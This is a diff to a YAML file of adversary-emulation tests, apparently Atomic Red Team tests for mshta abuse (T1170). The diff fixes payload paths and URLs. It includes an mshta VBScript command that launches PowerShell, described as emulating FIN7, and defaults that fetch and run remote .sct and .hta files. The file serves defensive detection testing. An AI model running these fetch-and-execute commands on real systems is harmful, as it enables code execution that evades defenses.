@@ -12,7 +12,7 @@ atomic_tests:
     file_url:
       description: location of the payload
       type: Url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct
   executor:
     name: command_prompt
     elevation_required: false
@@ -43,15 +43,10 @@ atomic_tests:
     This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
   supported_platforms:
     - windows
-  input_arguments:
-    atomics_path:
-      description: path to atomics folder
-      type: path
-      default: ..\..\atomics
   executor:
     name: command_prompt
     command: |
-      mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")
+      mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file $PathToAtomicsFolder\T1170\src\powershell.ps1"":close")
 
 - name: Mshta Executes Remote HTML Application (HTA)
   description: |
@@ -63,7 +58,7 @@ atomic_tests:
     hta_url:
       description: URL to HTA file for execution
       type: string
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/T1170.hta
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta
   executor:
     name: command_prompt
     command: |
